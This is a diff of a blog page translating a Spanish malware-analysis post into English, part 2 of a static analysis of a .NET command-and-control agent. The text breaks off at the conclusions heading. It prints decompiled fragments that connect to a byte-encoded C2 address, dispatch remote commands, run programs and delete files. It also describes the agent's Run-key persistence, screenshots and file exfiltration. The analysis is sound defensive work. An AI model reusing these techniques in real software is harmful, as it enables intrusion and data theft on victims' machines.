@@ -1,23 +1,23 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
   <head>
     
       <title>
-        004 - Analizando un agente de C2 - Parte 2: el agente
+        004 - Analyzing a C2 agent - Part 2: the agent
       </title>
     
     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta
   name="description"
-  content="En este artículo, continuación directa del artículo anterior, analizamos un agente de C2 desarrollado en .NET para identificar cómo evade defensas, las capacidades que ofrece, y cómo podemos obtener indicadores de compromiso de este."
+  content="In this article, a direct continuation of the previous article, we analyze a C2 agent developed in .NET to identify how it evades defenses, the capabilities it offers, and how we can obtain indicators of compromise from it."
 />
 <meta
   name="keywords"
   content=""
 />
 <meta name="robots" content="noodp" />
-<link rel="canonical" href="/es/posts/004-analyzing-a-dotnet-c2-agent/" />
+<link rel="canonical" href="/en/posts/004-analyzing-a-dotnet-c2-agent/" />
 <link rel="me" href="https://infosec.exchange/@stapia"/>
 
 
@@ -44,17 +44,17 @@
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="004 - Analizando un agente de C2 - Parte 2: el agente"/>
-<meta name="twitter:description" content="En este artículo, continuación directa del artículo anterior, analizamos un agente de C2 desarrollado en .NET para identificar cómo evade defensas, las capacidades que ofrece, y cómo podemos obtener indicadores de compromiso de este."/>
+<meta name="twitter:title" content="004 - Analyzing a C2 agent - Part 2: the agent"/>
+<meta name="twitter:description" content="In this article, a direct continuation of the previous article, we analyze a C2 agent developed in .NET to identify how it evades defenses, the capabilities it offers, and how we can obtain indicators of compromise from it."/>
 
 
 
-<meta property="og:title" content="004 - Analizando un agente de C2 - Parte 2: el agente" />
-<meta property="og:description" content="En este artículo, continuación directa del artículo anterior, analizamos un agente de C2 desarrollado en .NET para identificar cómo evade defensas, las capacidades que ofrece, y cómo podemos obtener indicadores de compromiso de este." />
+<meta property="og:title" content="004 - Analyzing a C2 agent - Part 2: the agent" />
+<meta property="og:description" content="In this article, a direct continuation of the previous article, we analyze a C2 agent developed in .NET to identify how it evades defenses, the capabilities it offers, and how we can obtain indicators of compromise from it." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/es/posts/004-analyzing-a-dotnet-c2-agent/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-12-26T12:03:49-05:00" />
-<meta property="article:modified_time" content="2023-12-26T12:03:49-05:00" /><meta property="og:site_name" content="Threat Anatomy Blog" />
+<meta property="og:url" content="/en/posts/004-analyzing-a-dotnet-c2-agent/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-26T12:05:50-05:00" />
+<meta property="article:modified_time" content="2023-12-26T12:05:50-05:00" /><meta property="og:site_name" content="Threat Anatomy Blog" />
 
 
 
@@ -90,7 +90,7 @@
     
       
         
-          <li><a href="/es/contact">Contacto</a></li>
+          <li><a href="/en/contact">Contact</a></li>
         
       
       
@@ -100,7 +100,7 @@
   <ul class="menu__inner menu__inner--mobile">
     
       
-        <li><a href="/es/contact">Contacto</a></li>
+        <li><a href="/en/contact">Contact</a></li>
       
     
   </ul>
@@ -137,7 +137,7 @@
               
               
                 
-                <li><a title="English" href="/en/posts/004-analyzing-a-dotnet-c2-agent/"><img id="trans-flag" src=/img/flag-great-britain.png alt="English" /></a></li>
+                <li><a title="Spanish" href="/es/posts/004-analyzing-a-dotnet-c2-agent/"><img id="trans-flag" src=/img/flag-spain.png alt="Spanish" /></a></li>
               
             
           
@@ -154,7 +154,7 @@
   
 
   <article class="post">
-    <h1 class="post-title">004 - Analizando un agente de C2 - Parte 2: el agente</h1>
+    <h1 class="post-title">004 - Analyzing a C2 agent - Part 2: the agent</h1>
     <div class="post-meta">
       
         <time class="post-date">
@@ -171,7 +171,7 @@
 
       
         <span class="post-read-time"
-          >— 10 min de lectura</span
+          >— 10 min read</span
         >
       
     </div>
@@ -182,29 +182,29 @@
 
     <div class="post-content">
       
-      <p><em>This article is also available in <a href="/en/posts/004-analyzing-a-dotnet-c2-agent/">english</a></em></p>
-<h2 id="1-introducción">
-  1. Introducción
-  <a href="#1-introducci%c3%b3n" class="h-anchor" aria-hidden="true">#</a>
+      <p><em>Este artículo también está disponible en <a href="/es/posts/004-analyzing-a-dotnet-c2-agent/">español</a></em></p>
+<h2 id="1-introduction">
+  1. Introduction
+  <a href="#1-introduction" class="h-anchor" aria-hidden="true">#</a>
 </h2>
-<p>En <a href="/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">la primera parte de este artículo</a> identificamos que, luego de implemenetar ciertas técnicas para dificultar su detección, la macro maliciosa que analizamos extraía y ejecutaba un binario .exe que tenía embebido. En esta parte, analizaremos dicho binario de manera estática para comprender cómo funciona, cómo identificamos que corresponde a un agente de C2, y qué indicadores de compromiso podemos obtener de este.</p>
-<p>Debido a la longitud del artículo, en una tercera parte se evaluará de manera dinámica el binario.</p>
+<p>In <a href="/en/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">the first part of this article</a> we identified that, after implementing certain techniques to make detection more difficult, the malicious macro we analyzed extracted and executed an embedded .exe binary. In this part, we will analyze said binary statically to understand how it works, how we determine that it corresponds to a C2 agent, and what indicators of compromise we can obtain from it.</p>
+<p>Due to the length of the article, we will evaluate the binary dynamically in a third installment.</p>
 <blockquote>
-<p><strong>Disclaimer</strong>: Ejecutar malware en un dispositivo personal/corporativo puede poner en riesgo tu información/la información de tu empresa. Nunca ejecutes malware en un dispositivo que no ha sido específicamente configurado para el análisis.</p>
+<p><strong>Disclaimer</strong>: Running malware on a personal or corporate device can put your information/your company&rsquo;s information at risk. Never run malware on a device that has not been specifically configured for malware analysis.</p>
 </blockquote>
-<h2 id="2-análisis-estático-del-ejecutable">
-  2. Análisis estático del ejecutable
-  <a href="#2-an%c3%a1lisis-est%c3%a1tico-del-ejecutable" class="h-anchor" aria-hidden="true">#</a>
+<h2 id="2-static-analysis-of-the-executable">
+  2. Static analysis of the executable
+  <a href="#2-static-analysis-of-the-executable" class="h-anchor" aria-hidden="true">#</a>
 </h2>
-<h3 id="21-identificación-de-hashes-y-framework-de-desarrollo-utilizado">
-  2.1 Identificación de hashes y framework de desarrollo utilizado
-  <a href="#21-identificaci%c3%b3n-de-hashes-y-framework-de-desarrollo-utilizado" class="h-anchor" aria-hidden="true">#</a>
+<h3 id="21-identifying-the-binarys-hashes-and-the-development-framework-it-uses">
+  2.1 Identifying the binary&rsquo;s hashes and the development framework it uses
+  <a href="#21-identifying-the-binarys-hashes-and-the-development-framework-it-uses" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p>Iniciamos el análisis obteniendo el hash del ejecutable:</p>
+<p>We start the analysis by obtaining the hash of the executable:</p>
 <table>
 <thead>
 <tr>
-<th>Algoritmo</th>
+<th>Algorithm</th>
 <th>Hash</th>
 </tr>
 </thead>
@@ -219,41 +219,41 @@
 </tr>
 </tbody>
 </table>
-<p>Al abrir el binario en <a href="https://www.winitor.com/download">PEStudio</a>, podemos identificar algunas cosas interesantes:</p>
+<p>After opening the binary in <a href="https://www.winitor.com/download">PEStudio</a>, we see some interesting things:</p>
 <p><img src="/img/004-pestudio1.png" alt="alt text" title="PEStudio Analysis"></p>
 <ol>
-<li>PEStudio identifica el binario como de tipo &ldquo;Microsoft .NET&rdquo;</li>
-<li>El binario parece haber sido compilado el 05 de Setiembre del 2023, por lo que es reciente. (Dicho valor puede ser alterado por lo que no es 100% confiable)</li>
-<li>Se identifica la ruta del archivo &ldquo;debug&rdquo; del binario, la cual contiene \obj\Debug, directorio estándar creado por Visual Studio.</li>
+<li>PEStudio identifies the binary as of &ldquo;Microsoft .NET&rdquo; type.</li>
+<li>The binary appears to have been compiled on September 05 2023, so it is recent (this value can be altered so it is not 100% reliable).</li>
+<li>The path to the &ldquo;debug&rdquo; file of the binary is identified, which contains \obj\Debug, a standard directory created by Visual Studio.</li>
 </ol>
-<p>Dichos factores parecen indicarnos que se trata de un programa .NET; adicionalmente, analizando algunas de las otras secciones de información que ofrece PEStudio podemos obtener mayor confirmación sobre esto:</p>
+<p>These factors seem to suggest that it is a .NET program; additionally, by analyzing some of the other sections provided by PEStudio we can get further confirmation of this:</p>
 <p><img src="/img/004-pestudio2.png" alt="alt text" title="PEStudio Indicators"></p>
 <p><img src="/img/004-pestudio3.png" alt="alt text" title="PEStudio Imports"></p>
 <ol>
-<li>PEStudio identifica el namespace .NET System.Net.Socket</li>
-<li>PEStudio identifica que el programa, durante su ejecución, importa <a href="https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0">clases de .NET</a></li>
+<li>PEStudio identifies the .NET namespace System.Net.Socket</li>
+<li>PEStudio identifies that the program, during its execution, imports <a href="https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0">.NET classes</a></li>
 </ol>
-<p>Con dicha información, podemos decir con casi total certeza de que el binario corresponde a uno desarrollado con el framework .NET. Adicionalmente, verificamos que PEStudio identifica una IP, que puede ser un indicador de compromiso (IOC) de interés.</p>
-<h3 id="decompilación-de-binarios-net">
-  Decompilación de binarios .NET
-  <a href="#decompilaci%c3%b3n-de-binarios-net" class="h-anchor" aria-hidden="true">#</a>
+<p>With this information, we can say with near total certainty that the binary corresponds to one developed with the .NET framework. Additionally, we see that PEStudio identifies an IP, which may be an indicator of compromise (IOC) of interest.</p>
+<h3 id="decompilation-of-net-binaries">
+  Decompilation of .NET binaries
+  <a href="#decompilation-of-net-binaries" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p>Los programas desarrollados en .NET son usualmente suceptibles a ser decompilados, debido a que no se compilan directamente al lenguaje máquina binario que la computadora entiende (los 0 y 1). En su lugar, se compilan a un lenguaje intermedio conocido como Intermediate Language (IL), el cual es convertido durante la ejecución del programa al lenguaje máquina específico del entorno en el que se está ejecutando.</p>
-<p>Si bien dicho framework provee flexibilidad, el lenguaje intermedio contiene información sobre nombres de clases, métodos, metadata, etc., lo que permite que sea decompilado y así, &ldquo;revertido&rdquo; casi a su forma original.</p>
-<p>Existen distintas herramientas que permiten decompilar un binario creado en .NET, entre las que se encuentran <a href="https://github.com/icsharpcode/ILSpy"><em>ILSpy</em></a> y <a href="https://github.com/dnSpy/dnSpy"><em>dnSpy</em></a>; para el presente análisis utilizaré <em>dnSpy</em> debido a las capacidades de debugging que ofrece.</p>
-<h3 id="22-análisis-inicial-del-binario">
-  2.2 Análisis inicial del binario
-  <a href="#22-an%c3%a1lisis-inicial-del-binario" class="h-anchor" aria-hidden="true">#</a>
+<p>Programs developed in .NET are usually susceptible to decompilation because they are not compiled directly to the binary machine language that the computer understands (the 0&rsquo;s and 1&rsquo;s). Instead, they are compiled to an intermediate language (IL), which is converted during the program&rsquo;s execution to the specific machine language of the environment in which it is running.</p>
+<p>Although this framework provides flexibility, the intermediate language contains information about classes names, methods, metadata, etc., which allows it to be decompiled and thus, &ldquo;reverted&rdquo; almost to its original form.</p>
+<p>There are different tools that allow decompiling a binary created in .NET, among them <a href="https://github.com/icsharpcode/ILSpy"><em>ILSpy</em></a> and <a href="https://github.com/dnSpy/dnSpy"><em>dnSpy</em></a>; for this analysis I will use <em>dnSpy</em> due to the debugging capabilities it offers.</p>
+<h3 id="22-initial-analysis-of-the-binary">
+  2.2 Initial analysis of the binary
+  <a href="#22-initial-analysis-of-the-binary" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p>Al abrir el ejecutable en <em>dnSpy</em>, validamos que efectivamente podemos visualizar el código:</p>
+<p>When we open the executable in <em>dnSpy</em>, we validate that we can indeed visualize the code:</p>
 <p><img src="/img/004-dnspy.png" alt="alt text" title="dnSpy"></p>
-<p>Dado que analizar cada función que llama el ejecutable puede ser muy tedioso (especialmente si contiene código basura destinado a dificultar el análisis), seguiremos el flujo de llamadas que se hacen desde el método Main.</p>
+<p>Since analyzing each function called by the executable can be very tedious (specially if it contains garbage code to hinder analysis), we will follow the flow of calls made from the Main method.</p>
 <ol>
-<li>Verificamos que cuando el programa se inicia llama al formulario Form1, el cual, al inicializarse, invoca al método <strong>InitializeComponent()</strong>. De la configuración de dicho método podemos destacar tres cosas:
+<li>We verify that when the program starts it calls the Form1 form, which, when initialized, invokes the <strong>InitializeComponent()</strong> method. From this method&rsquo;s configuration we can gather three things:
 <ol>
-<li>Se configura la opacidad del formulario a 0 para hacer de este invisible.</li>
-<li>Se configura para que no tenga un ícono en la barra de tareas.</li>
-<li>Se llama al método <strong>Form1_Load</strong>.</li>
+<li>The opacity of the form is set to 0 to make it invisible.</li>
+<li>The form is configured not to have an icon in the taskbar.</li>
+<li>The method <strong>Form1_Load</strong> is called.</li>
 </ol>
 </li>
 </ol>
@@ -271,7 +271,7 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>		}
 </span></span></code></pre></div><ol start="2">
-<li>El método <strong>Form1_Load</strong> detiene la ejecución (&ldquo;duerme&rdquo;) por unos segundos antes de llamar al método <strong>corediQart()</strong>:</li>
+<li>The <strong>Form1_Load</strong> method stops execution (&ldquo;sleeps&rdquo;) for a few seconds before calling the <strong>corediQart()</strong> method:</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> Form1_Load(<span style="color:#66d9ef">object</span> sender, EventArgs e)
 </span></span><span style="display:flex;"><span>		{
@@ -289,14 +289,14 @@
 </span></span><span style="display:flex;"><span>			{
 </span></span><span style="display:flex;"><span>			}
 </span></span><span style="display:flex;"><span>		}
-</span></span></code></pre></div><p>Esta técnica (<a href="https://attack.mitre.org/techniques/T1497/003/">T1497.003</a>) usualmente es utilizada por atacantes para evadir herramientas de análisis dinámico, muchas de las cuales solo están activas por un corto tiempo y puede que crean que un binario no tiene comportamiento malicioso solo porque aún no es ejecutado. En este caso, desde mi punto de vista, los tiempos son muy cortos para estar utilizando dicha técnica, por lo que probablemente están para dar tiempo a otros componentes del programa de terminar de cargar.</p>
+</span></span></code></pre></div><p>This technique (<a href="https://attack.mitre.org/techniques/T1497/003/">T1497.003</a>) is usually used by attackers to evade dynamic analysis tools, many of which are only active for a short period of time and may believe that a binary does not have malicious behavior just because it is not yet executed. In this case, from my point of view, the times are too short to be useful for this technique, so they are probably to give time to other components of the program to finish loading.</p>
 <ol start="3">
-<li>El método <strong>corediQart()</strong> realiza las siguientes acciones:
+<li>The <strong>corediQart()</strong> method performs the following actions:
 <ol>
-<li>Asigna el primer puerto definido en la variable <em>ports</em> a la variable <em>port</em>.</li>
-<li>Obtiene el nombre de la computadora donde se está ejecutando, así como el usuario que está ejecutando el programa y lo asigna a la variable <em>userAiunt</em>.</li>
-<li>Crea un objeto de tipo <em>TimerCallback</em> que llama al método <strong>procvQloop</strong>.</li>
-<li>Configura el objeto de tipo <em>TimerCallback</em> para que se ejecute cada 58.51 segundos, luego de esperar inicialmente 49.12 segundos.</li>
+<li>Assigns the first port defined in the <em>ports</em> variable to the <em>port</em> variable.</li>
+<li>Gets the name of the computer where the program is running, as well as the user running the program and assigns it to the <em>userAiunt</em> variable.</li>
+<li>Creates an object of type <em>TimerCallback</em> that calls the <strong>procvQloop</strong> method.</li>
+<li>Set the object of type <em>TimerCallback</em> to run every 58.51 seconds, after initially waiting 49.12 seconds.</li>
 </ol>
 </li>
 </ol>
@@ -325,20 +325,20 @@
 </span></span><span style="display:flex;"><span>			...
 </span></span><span style="display:flex;"><span>		}
 </span></span></code></pre></div><ol start="4">
-<li>Analizando lo que hace el método <strong>procvQloop()</strong>, inicia una conexión TCP con la IP almacenada en la variable <em>min_codns</em>; en dicha variable, la IP se encuentra almacenada como un conjunto de bytes, probablemente para dificultar su detección:</li>
+<li>Analyzing what the <strong>procvQloop()</strong> method does, it initiates a TCP connection with the IP stored in the <em>min_codns</em> variable; in that variable, the IP is stored as a set of bytes, probably to make detection more difficult:</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>DIRERRIF.mainwtp = Encoding.UTF8.GetString(DIRERRIF.min_codns, <span style="color:#ae81ff">0</span>, DIRERRIF.min_codns.Length).ToString();
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.maiedet = <span style="color:#66d9ef">new</span> TcpClient();
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.maiedet.Connect(DIRERRIF.mainwtp, DIRERRIF.port);
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] min_codns = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[]
 </span></span><span style="display:flex;"><span>{<span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">55</span>};
-</span></span></code></pre></div><p>La conexión TCP se realiza con la IP almacenada en la variable <em>min_codns</em> en el puerto asignado a la variable <em>port</em>.</p>
+</span></span></code></pre></div><p>The TCP connection is established with the IP stored in the <em>min_codns</em> variable on the port assigned to the <em>port</em> variable.</p>
 <ol start="5">
-<li>Una vez realizada la conexión, si es exitosa, se llama al método <strong>procD_core()</strong>, el cual realiza múltiples operaciones:
+<li>Once the connection is made, if successful, the <strong>procD_core()</strong> method is called, which performs multiple operations:
 <ol>
-<li>Obtiene una respuesta de la conexión TCP establecida previamente.</li>
-<li>Separa la respuesta obtenida utilizando el separador &lsquo;=&rsquo;.</li>
-<li>En base al primer valor de la respuesta (lo que estaba antes del &lsquo;=&rsquo;) llama a distintos métodos.</li>
+<li>Gets a response from the previously established TCP connection.</li>
+<li>Separate the obtained answer using the &lsquo;=&rsquo; separator.</li>
+<li>Based on the first value of the answer (what was before the &lsquo;=&rsquo;) it calls different methods.</li>
 </ol>
 </li>
 </ol>
@@ -388,77 +388,77 @@
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> result;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Sin analizar el resto de las funciones, el comportamiento del programa ya nos hace suponer que puede ser un agente de C2:</p>
+</span></span></code></pre></div><p>Without analyzing the rest of the functions, the behavior of the program already suggests that it might be a C2 agent:</p>
 <ol>
-<li>Cada cierto tiempo (aproximadamente cada minuto), se comunica con un servidor basado en una IP y un puerto no común.</li>
-<li>Recibe respuesta del servidor, la cual se compone de dos secciones.</li>
-<li>En base a la primera sección (comandos), llama a métodos pasándoles la segunda sección (payload/parámetros del comando).</li>
+<li>Every so often (approximately every minute), it communicates with a server using a non-common IP and a non-common port.</li>
+<li>It receives a response from the server, which is composed of two sections.</li>
+<li>Based on the first section (commands), it calls methods by passing them the second section (payload/command parameters).</li>
 </ol>
-<p>En base a dicho análisis podemos asumir que el servidor envía comandos al agente, el cual los ejecuta. Posterior análisis nos permitirá confirmar si realmente es un agente de Comando y Control, así como las capacidades que tiene este agente.</p>
-<h3 id="23-análisis-de-los-métodos-del-agente-de-c2">
-  2.3 Análisis de los métodos del agente de C2
-  <a href="#23-an%c3%a1lisis-de-los-m%c3%a9todos-del-agente-de-c2" class="h-anchor" aria-hidden="true">#</a>
+<p>Based on this analysis we can assume that the server sends commands to the agent, which executes them. Further analysis will allow us to confirm if it is really a Command and Control agent, as well as the capabilities that this agent has.</p>
+<h3 id="23-analysis-of-c2-agent-functions">
+  2.3 Analysis of C2 agent functions
+  <a href="#23-analysis-of-c2-agent-functions" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p>Debido a que analizar cada función sería muy tedioso, analizaremos algunas funciones que me parecieron interesantes:</p>
-<h4 id="231-listar-procesos">
-  2.3.1 Listar procesos
-  <a href="#231-listar-procesos" class="h-anchor" aria-hidden="true">#</a>
+<p>Since analyzing each function would be very tedious, we will analyze some functions that I found interesting:</p>
+<h4 id="231-list-processes">
+  2.3.1 List processes
+  <a href="#231-list-processes" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>Al igual que en la macro que contenía el binario, se visualiza el uso de subguiones para separar comandos/variables:</p>
+<p>As in the macro containing the binary, the use of underscores to separate commands/variables is seen:</p>
 <p><img src="/img/004-lp1.png" alt="alt text" title="Obfuscation"></p>
-<p>Al recibir el comando &ldquo;geyTtavs&rdquo;, se obtienen los procesos que se están ejecutando en el sistema y se envía el ID y nombre de estos mediante la función <strong>loadQData</strong>:</p>
+<p>When the &ldquo;geyTtavs&rdquo; command is received, the processes running on the system are obtained and their ID and name are sent to the server using the <strong>loadQData</strong> function:</p>
 <p><img src="/img/004-lp2.png" alt="alt text" title="List Processes"></p>
-<p>La función <strong>loadQData</strong> envía el tipo de respuesta a esperar, el tamaño de esta y la respuesta al servidor.</p>
-<p>Con solo analizar la función de listar procesos, podemos confirmar que es un agente de Comando y Control: el programa se contacta a un servidor, recibe una instrucción (listar procesos en este caso) y envía la respuesta al servidor.</p>
-<h4 id="232-establecer-persistencia">
-  2.3.2 Establecer persistencia
-  <a href="#232-establecer-persistencia" class="h-anchor" aria-hidden="true">#</a>
+<p>The <strong>loadQData</strong> function sends the type of response to expect, the size of the response and the response to the server.</p>
+<p>Just by analyzing the &ldquo;list processes&rdquo; function, we can confirm that it is indeed a Command and Control agent: the program contacts a server, receives an instruction (list processes in this case) and sends the response to the server.</p>
+<h4 id="232-establish-persistence">
+  2.3.2 Establish persistence
+  <a href="#232-establish-persistence" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>La llave de registro <em>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</em> es usualmente abusada por atacantes para establecer persistencia; dicha técnica está <a href="https://attack.mitre.org/techniques/T1547/001/">catalogada en MITRE ATT&amp;CK con ID T1547.001</a> y <a href="https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys">permite a un atacante ejecutar un programa cuando el usuario inicia sesión</a>, bajo el contexto (permisos) de ese usuario.</p>
-<p>Verificamos que el agente ofrece la capacidad de establecer persistencia, al recibir el comando &ldquo;puyTtsrt&rdquo; crea la llave de registro con nombre &ldquo;haijwivetsgVr&rdquo;:</p>
+<p>The registry key <em>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</em> is usually abused by attackers to establish persistence; such technique is <a href="https://attack.mitre.org/techniques/T1547/001/">listed in MITRE ATT&amp;CK with ID T1547.001</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys">allows an attacker to run a program when the user logs in</a>, under the context (permissions) of that user.</p>
+<p>We verify that the agent provides the capability to establish persistence. On receiving the command &ldquo;puyTtsrt&rdquo; it creates the registry key with name &ldquo;haijwivetsgVr&rdquo;:</p>
 <p><img src="/img/004-pers1.png" alt="alt text" title="Establish persistence 1"></p>
 <p><img src="/img/004-pers2.png" alt="alt text" title="Establish persistence 2"></p>
 <p><img src="/img/004-pers3.png" alt="alt text" title="Establish persistence 3"></p>
-<p>Al igual que antes, vemos que el nombre de la ruta en el registro ha sido dividido utilizando subguiones para dificultar su identificación.</p>
-<h4 id="233-listar-archivos">
-  2.3.3 Listar archivos
-  <a href="#233-listar-archivos" class="h-anchor" aria-hidden="true">#</a>
+<p>As before, we see that the path name in the registry has been split using underscores to make identification more difficult.</p>
+<h4 id="233-list-files">
+  2.3.3 List files
+  <a href="#233-list-files" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>Al recibir el comando &ldquo;flyTes&rdquo; junto con una ruta, el comando lista los archivos de la ruta utilizando el método <strong>Directory.GetFiles</strong>, los concatena utilizando el caracter &lsquo;&gt;&rsquo; como separador y los envía al servidor:</p>
+<p>Upon receiving the &ldquo;flyTes&rdquo; command along with a path, the command lists the files in the path using the <strong>Directory.GetFiles</strong> method, concatenates them using the character &lsquo;&gt;&rsquo; as a separator and sends them to the server:</p>
 <p><img src="/img/004-listfiles.png" alt="alt text" title="Listing files"></p>
 <p><img src="/img/004-listfiles2.png" alt="alt text" title="Read directory"></p>
-<h4 id="234-sacar-capturas-de-pantalla">
-  2.3.4 Sacar capturas de pantalla
-  <a href="#234-sacar-capturas-de-pantalla" class="h-anchor" aria-hidden="true">#</a>
+<h4 id="234-take-screenshots">
+  2.3.4 Take screenshots
+  <a href="#234-take-screenshots" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>Los comandos &ldquo;cdyTcrgn&rdquo;, &ldquo;csyTcrgn&rdquo; y &ldquo;csyTdcrgn&rdquo; pueden ser utilizados para sacar capturas de pantalla y enviarlas al servidor:</p>
+<p>The &ldquo;cdyTcrgn&rdquo;, &ldquo;csyTcrgn&rdquo; and &ldquo;csyTdcrgn&rdquo; commands can be used to take screenshots and send them to the server:</p>
 <p><img src="/img/004-sc1.png" alt="alt text" title="Screen capture 1"></p>
 <p><img src="/img/004-sc2.png" alt="alt text" title="Screen capture 2"></p>
 <p><img src="/img/004-sc3.png" alt="alt text" title="Screen capture 3"></p>
-<h4 id="235-exfiltración-de-archivos">
-  2.3.5 Exfiltración de archivos
-  <a href="#235-exfiltraci%c3%b3n-de-archivos" class="h-anchor" aria-hidden="true">#</a>
+<h4 id="235-file-exfiltration">
+  2.3.5 File exfiltration
+  <a href="#235-file-exfiltration" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>El comando &ldquo;afyTile&rdquo; puede ser utilizado para exfiltrar un archivo de la máquina víctima al servidor; para ello, recibe como parámetro la ruta del archivo a exfiltrar:</p>
+<p>The &ldquo;afyTile&rdquo; command can be used to exfiltrate a file from the victim&rsquo;s machine to the server; to do so, it receives the path of the file to exfiltrate as a parameter:</p>
 <p><img src="/img/004-exfilb.png" alt="alt text" title="File exfiltration"></p>
 <p><img src="/img/004-exfila.png" alt="alt text" title="File exfiltration 2"></p>
-<p>La información devuelta al servidor incluye la ruta del archivo, el nombre del archivo y el contenido de este.</p>
-<h4 id="236-ejecutar-binarios">
-  2.3.6 Ejecutar binarios
-  <a href="#236-ejecutar-binarios" class="h-anchor" aria-hidden="true">#</a>
+<p>The information sent back to the server includes the file path, the file name and the contents of the file.</p>
+<h4 id="236-execute-binaries">
+  2.3.6 Execute binaries
+  <a href="#236-execute-binaries" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>Para ejecutar un programa que exista en el sistema (sea nativo o descargado con otro comando), se utiliza  el comando &ldquo;ruyTnf&rdquo;, el cual inicia un nuevo proceso recibiendo como parámetro el nombre del programa a ejecutar.</p>
+<p>To execute a program that already exists in the system (either native or downloaded with another command), the &ldquo;ruyTnf&rdquo; command is used, which starts a new process receiving as a parameter the name of the program to be executed.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;ruyTnf&#34;</span>) {
-</span></span><span style="display:flex;"><span>  ..
+</span></span><span style="display:flex;"><span>  ...
 </span></span><span style="display:flex;"><span>    Process.Start(procss_type[<span style="color:#ae81ff">1</span>].Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[] { <span style="color:#e6db74">&#39;&gt;&#39;</span> })[<span style="color:#ae81ff">0</span>]);
 </span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> {
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h4 id="237-eliminar-un-archivo">
-  2.3.7 Eliminar un archivo
-  <a href="#237-eliminar-un-archivo" class="h-anchor" aria-hidden="true">#</a>
+</span></span></code></pre></div><h4 id="237-delete-a-file">
+  2.3.7 Delete a file
+  <a href="#237-delete-a-file" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>El comando &ldquo;deyTlt&rdquo; recibe como parámetro la ruta donde está almacenado un archivo, para posteriormente utilizar el método <strong>File.Delete</strong> para eliminarlo:</p>
+<p>The &ldquo;deyTlt&rdquo; command receives as a parameter the path where a file is stored, and then uses the <strong>File.Delete</strong> method to delete it:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;deyTlt&#34;</span>) {
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">this</span>.trasQfiles(procss_type[<span style="color:#ae81ff">1</span>]);
 </span></span><span style="display:flex;"><span>}
@@ -469,93 +469,93 @@
 </span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> {
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 id="3-conclusiones">
-  3. Conclusiones
-  <a href="#3-conclusiones" class="h-anchor" aria-hidden="true">#</a>
+</span></span></code></pre></div><h2 id="3-conclusions">
+  3. Conclusions
